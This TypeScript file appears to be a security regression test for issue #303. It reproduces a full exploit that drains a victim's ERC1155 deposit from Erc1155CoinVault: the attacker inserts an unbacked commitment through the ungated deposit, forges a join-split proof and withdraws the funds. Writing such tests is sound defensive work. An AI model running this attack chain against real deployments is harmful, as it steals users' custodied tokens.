/**
 * E2E #303 — ERC1155 fungible DRAIN via a forged join-split proof.
 *
 * A victim deposits V=1000 tokens (real, custodied). The attacker inserts an unbacked commitment for
 * an arbitrary amount through the ungated `Erc1155CoinVault.deposit` (single-token branch moves no
 * tokens), forges its join-split proof via the proofs-api, and withdraws V through the public
 * `Dvp.withdrawERC1155`. The circuit's `amount` is a free private input, so any amount is provable.
 *
 * Verdict (asserted == 'FIXED' → RED while vulnerable, GREEN once deposit is gated):
 *   VULNERABLE_DRAIN            attacker's balance rose by V it never deposited — exploit complete
 *   VULNERABLE_DEPOSIT_UNGATED  the ungated deposit landed but the drain didn't finish — still RED
 *   FIXED                       the deposit was rejected → the attack could not start
 *
 * Requires the dev stack (private-hub + relayer-a + proofs-api :3003).
 */

import { expect } from 'chai';
import axios from 'axios';
import { ethers } from 'ethers';
import { DEFAULT_TIMEOUT, GAS_LIMIT, LOGGER } from '../../../src/config/env-config';
import { retry, submitTx } from '../../../src/utils/common';
import { isNonceError, isTransientRpcError } from '../../../src/exceptions-and-errors/block-chain-exceptions';
import { initializePrivacyNodesAndPnh, PrivacyNodeMap } from '../../setup';
import { PrivateHub } from '../../../src/entities/PrivateHub';
import { ERC1155Wrapper } from '../../../src/entities/tokens/ERC1155Wrapper';
import {
  ProductionErc1155Dvp, ProductionErc1155Dvp__factory,
  DvpErc1155PNH, DvpErc1155PNH__factory,
  Erc1155CoinVault, Erc1155CoinVault__factory,
  DvpTeleport, Dvp, Dvp__factory,
} from '../../../typechain-types';
import { createUserOperator } from '../../../src/utils/wallet-factory';
import type { IDvp } from '../../../typechain-types';
import { SUBGROUP, TREE_DEPTH, PROOFS_API, randField, withRetry, reconstructPath } from './dvp-proof-helpers';

describe('E2E SECURITY: Erc1155CoinVault fungible DRAIN via forged proof (#303) @security @erc1155 @dvp', function () {
  this.retries(0);
  this.timeout(DEFAULT_TIMEOUT * 2);

  const TOKEN_ID = 7n;
  const DEPOSIT_AMOUNT = 1000n;

  let privacyNodes: PrivacyNodeMap;
  let privateHub: PrivateHub;
  let pnhToken: DvpErc1155PNH;
  let assetAddr: string;
  let vaultAddr: string;
  let attacker: ethers.HDNodeWallet;
  let anchorBlock: number;
  let poseidon: ethers.Contract;

  const H = async (a: bigint, b: bigint): Promise<bigint> =>
    withRetry(async () => ethers.toBigInt(await poseidon.poseidon([a, b])));

  before(async function () {
    const { initializedNodes, initializedPNH } = await initializePrivacyNodesAndPnh(2);
    anchorBlock = await initializedPNH.provider.getBlockNumber();
    privacyNodes = initializedNodes;
    privateHub = initializedPNH;

    // Victim: register an ERC1155 DVP token, mint V, honestly deposit it into the vault.
    const erc1155 = new ERC1155Wrapper<ProductionErc1155Dvp>(privacyNodes.A, ProductionErc1155Dvp__factory);
    erc1155.setFields('dvp1155-303-drain');
    await erc1155.deploy();
    await erc1155.activateOnPn();
    await erc1155.activateOnHub(privateHub);
    await erc1155.mintAndAwait(privateHub, { toAddress: erc1155.userWallet.address, tokenId: TOKEN_ID, amount: DEPOSIT_AMOUNT });
    await erc1155.depositNftToDvp(privateHub, TOKEN_ID, DEPOSIT_AMOUNT);

    pnhToken = DvpErc1155PNH__factory.connect(await privateHub.getPNHContract<DvpErc1155PNH>(erc1155.symbol).getAddress(), privateHub.provider);
    vaultAddr = await pnhToken.vaultAddress();
    const vaultRO = Erc1155CoinVault__factory.connect(vaultAddr, privateHub.provider);
    assetAddr = ethers.getAddress(await vaultRO.getAssetContractAddress());
    poseidon = new ethers.Contract(await vaultRO.getHashContractAddress(), ['function poseidon(uint256[2] input) view returns (uint256)'], privateHub.provider);

    attacker = createUserOperator(privateHub.provider);
    await retry(async () => { const t = await privateHub.adminWallet.sendTransaction({ to: attacker.address, value: ethers.parseEther('0.2') }); await t.wait(); },
      { attempts: 5, delayMs: 500, retryIf: (e) => isNonceError(e) || isTransientRpcError(e) });

    expect(await pnhToken.balanceOf(vaultAddr, TOKEN_ID), 'vault must custody the victim deposit').to.equal(DEPOSIT_AMOUNT);
    LOGGER.log(`   vault ${vaultAddr} custodies ${DEPOSIT_AMOUNT} of #${TOKEN_ID}; attacker=${attacker.address}`);
  });

  it('attacker drains a victim-deposited ERC1155 balance with a self-forged join-split proof', async function () {
    const vault: Erc1155CoinVault = Erc1155CoinVault__factory.connect(vaultAddr, attacker);
    const dvpTeleport = privateHub.getContract<DvpTeleport>('DvpTeleport');
    const drainAmount = await pnhToken.balanceOf(vaultAddr, TOKEN_ID); // full balance
    const balBefore = await pnhToken.balanceOf(attacker.address, TOKEN_ID); // 0 (fresh EOA)
    let depositLanded = false;

    try {
      const sk = ethers.toBigInt(ethers.randomBytes(31)) % SUBGROUP;
      const P = (await H(sk, sk)) % SUBGROUP;
      const depositSalt = randField();
      const leaf = await H(await H(await H(await H(P, depositSalt), ethers.toBigInt(assetAddr)), TOKEN_ID), drainAmount);

      // Insert the unbacked commitment for an arbitrary amount (no tokens moved).
      await submitTx(() => vault.deposit([drainAmount, TOKEN_ID, P, depositSalt], { gasLimit: GAS_LIMIT }), 'attacker deposit (unbacked commitment) #303 ERC1155');
      depositLanded = true;

      const { indices, elements, root, treeNumber } = await reconstructPath(dvpTeleport, assetAddr, leaf, H, anchorBlock);
      expect(await withRetry(() => vault.verifyRoot(treeNumber, root)), 'reconstructed root must be a valid on-chain root').to.equal(true);

      // Forge the join-split proof: one real input (value V), output[0]=recipient(V), output[1]=change(0).
      // The service pads the other 9 inputs with dummies.
      const withdrawSalt = randField();
      const resp = (await withRetry(() => axios.post(`${PROOFS_API}/join-split-1155`, {
        nftCommitment: '0', valuesIn: [drainAmount.toString()], valuesOut: [drainAmount.toString(), '0'],
        keyPairsIn: [{ publicKey: P.toString(), privateKey: sk.toString() }],
        pubKeysOut: [{ publicKey: ethers.toBigInt(attacker.address).toString() }, { publicKey: '0' }],
        merkleDepth: TREE_DEPTH, merkleProofs: [{ indices: indices.toString(), elements: elements.map(String) }],
        merkleRoots: [root.toString()], treeNumbers: [Number(treeNumber)],
        erc1155Address: assetAddr, Erc1155TokenId: TOKEN_ID.toString(),
        saltsIn: [depositSalt.toString()], saltsOut: [withdrawSalt.toString(), randField().toString()], revertSalt: randField().toString(),
      }, { timeout: 90_000 }))).data;
      const receipt = joinSplitReceipt(resp);

      const dvp: Dvp = Dvp__factory.connect(privateHub.dvpAddress, attacker);
      await submitTx(() => dvp.withdrawERC1155(assetAddr, TOKEN_ID, drainAmount, attacker.address, withdrawSalt, receipt, '0x', { gasLimit: GAS_LIMIT }), 'attacker withdrawERC1155 #303');
    } catch (e: any) {
      LOGGER.log(`   attack chain halted — ${e?.shortMessage ?? e?.message ?? e}`);
    }

    const balAfter = await withRetry(() => pnhToken.balanceOf(attacker.address, TOKEN_ID));
    const vaultAfter = await withRetry(() => pnhToken.balanceOf(vaultAddr, TOKEN_ID));
    const attackerDrained = balAfter - balBefore === drainAmount;
    const verdict = attackerDrained ? 'VULNERABLE_DRAIN' : depositLanded ? 'VULNERABLE_DEPOSIT_UNGATED' : 'FIXED';
    LOGGER.log(`   RESULT: attacker #${TOKEN_ID} balance ${balBefore} -> ${balAfter}; vault -> ${vaultAfter}`);
    LOGGER.log(`   VERDICT: ${verdict}`);

    expect(
      verdict,
      '#303: the ungated Erc1155CoinVault.deposit let an unauthenticated attacker insert an unbacked ' +
        'commitment for an arbitrary amount and (VULNERABLE_DRAIN) withdraw the vault balance. Gate deposit ' +
        'with `restricted`. VULNERABLE_DEPOSIT_UNGATED means the deposit still landed (vuln present).',
    ).to.equal('FIXED');
  });
});

function joinSplitReceipt(r: any): IDvp.ProofReceiptStruct {
  if (!r?.pi_a || !r?.pi_b || !r?.pi_c || !Array.isArray(r?.public_signal))
    throw new Error(`proofs-api /join-split-1155 returned an unexpected shape: ${JSON.stringify(r)}`);
  const ps = r.public_signal as string[]; // [0]=msg,[1..10]=roots,[11..20]=nullifiers,[21..30]=trees,[31..32]=commitments,[33]=revert
  expect(ps.length, 'join-split public signal must be 34').to.equal(34);
  return {
    proof: { a: { x: r.pi_a[0], y: r.pi_a[1] }, b: { x: [r.pi_b[0][0], r.pi_b[0][1]], y: [r.pi_b[1][0], r.pi_b[1][1]] }, c: { x: r.pi_c[0], y: r.pi_c[1] } },
    treeNumbers: ps.slice(21, 31), message: ps[0], merkleRoots: ps.slice(1, 11),
    commitments: ps.slice(31, 33), nullifiers: ps.slice(11, 21), revertCommitment: ps[33],
  };
}
